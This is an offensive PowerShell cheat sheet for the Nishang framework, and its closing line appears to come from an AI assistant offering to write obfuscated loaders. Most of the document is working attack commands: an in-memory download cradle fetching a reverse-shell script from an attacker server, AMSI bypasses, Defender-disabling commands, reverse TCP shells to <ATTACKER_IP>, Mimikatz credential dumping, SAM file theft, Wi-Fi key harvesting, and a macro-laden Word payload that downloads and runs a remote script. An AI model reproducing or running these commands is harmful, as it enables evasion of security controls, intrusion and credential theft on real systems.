## 🛠️ Nishang & AMSI Bypass Master Cheat Sheet (Tactical Edition)

---

## 🧠 Core Operator Mindset

> [!INFO] 🎯 Memory-Only Execution Philosophy
> 
> Bash
> 
> ```unset
> Touch no disk.
> Blind the script host.
> Execute natively in RAM.
> ```
> 
> 💡 Nishang is the premier offensive PowerShell framework. Because anti-virus products flag these scripts on disk, you must execute payloads directly in volatile memory (RAM) and eliminate AMSI protection boundaries before running them.

---

## ⚡ Phase 1 — Memory Injection & Download Cradles

Bypass traditional disk-based antivirus scans by piping raw payload strings directly into the live terminal process runspace.

## 🔍 In-Memory Download & Execute (IEX Cradle)

> [!SUCCESS] 🌐 Memory-Only Staging
> 
> Powershell
> 
> ```powershell
> powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
> ```
> 
> 💡 Mechanics:
> 
> - Downloads the targeted script silently over HTTP and runs it directly in RAM without writing to disk.
> - Automatically exports all internal script functions into your active session context.
> - !note if it dont work downlaod script forst then run

## ⚔️ Base64 Encoded Script Block Execution

> [!TIP] 🧠 Evading Command-Line Auditing
> 
> Powershell
> 
> ```powershell
> powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_STREAM>
> ```
> 
> 💡 Strategy:
> 
> - Obfuscates the structural layout of your one-liner script execution string from basic network logging sensors.
> - Ensure the target function call is appended explicitly to the bottom of the script _before_ encoding it.

---

## ⚡ Phase 2 — Defensive Layer Disablement (AMSI Bypasses)

AMSI intercepts scripts directly at the script host interpreter level right as the plaintext layout unrolls. Blind the monitoring engine using memory patching techniques before staging heavy tooling.

## 💣 Matt Graeber's Memory Patching One-Liner (Reflection)

> [!DANGER] 🚀 Break AMSI Initialization Internals
> 
> Powershell
> 
> ```powershell
> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
> ```
> 
> 💡 Strategy:
> 
> - Uses .NET Reflection mechanisms to locate the hidden internal `amsiInitFailed` static flag field in memory.
> - Enforces a value of `$true` to trick the execution host into believing AMSI permanently crashed during initialization, disabling all subsequent stream scans.

## ⚔️ Forcing Legacy Engine Fallback (PowerShell v2.0)

> [!WARNING] 🕶️ Evade Modern Monitoring Frameworks
> 
> Powershell
> 
> ```powershell
> powershell.exe -Version 2.0 -ExecutionPolicy Bypass
> ```
> 
> 💡 Strategy:
> 
> - Launches a legacy runtime context that completely lacks native AMSI instrumentation hooks.
> - Requires the presence of the older `.NET 3.5` compilation architecture on the target workstation.

## 👻 Built-In Defender Configuration Disablement

> [!BUG] ☠️ Direct AV State Mutation
> 
> Powershell
> 
> ```powershell
> # Disable Real-Time Monitoring (Requires Elevated Shell)
> Set-MpPreference -DisableRealtimeMonitoring $true
> 
> # Disable IOAV Scan Protections over Internet Downloads
> Set-MpPreference -DisableIOAVProtection $true
> ```
> 
> 💡 Strategy:
> 
> - `-DisableRealtimeMonitoring`: Completely suspends the endpoint's continuous background detection capabilities.
> - `-DisableIOAVProtection`: Prevents the scanner engine from processing files originating via remote download cradle strings.

---

## ⚡ Phase 3 — High-Value Nishang Operational Payloads

## 🔬 Interactive Network Shells & Control Channels

> [!SUCCESS] 🧩 Access Foothold Delivery
> 
> Powershell
> 
> ```powershell
> # Establish interactive reverse TCP terminal connection back to listener
> Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>
> 
> # Highly minimized single-line reverse connect code snippet
> Invoke-PowerShellTcpOneLine -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>
> ```

## ⚔️ Credential Harvesting & Local Database Extraction

> [!DANGER] 🚀 Disclose Identity Secrets
> 
> Powershell
> 
> ```powershell
> # Reflexively load and execute custom customized Mimikatz binaries directly in RAM
> Invoke-Mimikatz -DumpCreds
> 
> # Replicate the local Volume Shadow Copy service to safely steal active SAM files
> Copy-VSS -Destination C:\Windows\Temp\
> 
> # Harvest cleartext wireless network access passwords stored on the system
> Get-WLAN-Keys
> ```

## 🕵️ Client-Side Exploitation & Phishing Weaponization

> [!WARNING] ☣️ Generate Weaponized Payloads
> 
> Powershell
> 
> ```powershell
> # Build a macro-infected Word document embedding your custom AMSI bypass and shell payload
> Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -NoProfile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
> ```

---

## ⚡ Phase 4 — Core Framework Setup & Help Retrieval

## 📦 Local Module Importation Strategy

> [!SUCCESS] ⚙️ Load the Suite Natively
> 
> Powershell
> 
> ```powershell
> # Import the entire integrated framework module directly into your local attack session
> Import-Module .\nishang.psm1
> 
> # Target and load an individual operational script file directly using dot sourcing
> . .\Gather\Get-Information.ps1
> ```

## 🔍 Structural Help & Functional Inspection

> [!TIP] 🧠 Resolve Argument Requirements
> 
> Powershell
> 
> ```powershell
> # Dot-source the target file to initialize its capabilities into terminal memory space
> . .\Gather\Get-Information.ps1
> 
> # Request complete argument breakdowns directly against the loaded internal function name
> Get-Help Get-Information -Full
> ```

---

Next Steps & Pro Tips

- Remember that memory patching commands will generate a native Event ID 4104 (Suspicious Script Block Logging) alert in the Windows event directory log stream.
- To maintain clean access, let me know if you would like me to provide an obfuscated loader string wrapper to strip structural syntax keywords, or specify which phase of post-exploitation data gathering you would like to automate next.